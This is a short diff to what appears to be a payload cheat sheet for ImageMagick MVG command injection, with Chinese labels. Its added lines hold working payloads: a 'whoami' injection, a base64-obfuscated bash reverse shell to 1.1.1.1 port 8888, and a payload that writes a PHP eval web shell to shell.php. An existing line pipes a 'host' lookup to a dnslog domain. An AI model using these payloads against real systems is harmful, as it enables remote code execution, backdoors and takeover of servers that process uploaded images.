@@ -41,3 +41,23 @@ push graphic-context
 viewbox 0 0 640 480
 image copy 200,200 100,100 "|host image.99fd5e.dnslog.info"
 pop graphic-context
+
+---------------------------------------------------------------------
+other
+无回显 可利用dnslog查看
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/1.jpg"|whoami")'
+pop graphic-context
+ 
+反弹shell
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.0/1.jpg"|echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEuMS4xLjEvODg4OCAwPiYx== | base64 -d| bash ")'
+pop graphic-context
+ 
+写shell
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/1.jpg"|echo \'<?php eval($_POST[\'ant\']);?>\' > shell.php")'
+pop graphic-context
